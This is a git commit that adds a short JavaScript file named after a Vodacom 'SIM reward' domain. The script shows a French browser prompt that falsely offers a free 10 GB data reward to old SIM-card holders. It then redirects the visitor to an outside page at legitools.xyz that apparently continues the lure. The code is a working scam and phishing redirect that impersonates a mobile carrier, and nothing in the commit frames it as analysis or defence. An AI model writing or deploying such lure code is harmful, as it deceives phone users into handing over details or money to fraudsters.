555657b0d97e86b28dfa8cf4c0845d306b484296
harryjohnson86 <mfonjohnson86@gmail.com>
2025-02-19 04:05:38 -0800

    Create vodacom-simreward.com.js

---
+++ vodacom-simreward.com.js
@@ -0,0 +1,5 @@
+var password = 'Données gratuites de la carte SIM'
+password=prompt('SMS: Vérifiez ici si votre numéro est éligible pour recevoir une RÉCOMPENSE DE CARTE SIM ANCIENNE DE 10 Go, veuillez appuyer sur OK pour ACTIVER. ','Données gratuites de la carte SIM');
+if (password != 'Données gratuites de la carte SIM') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
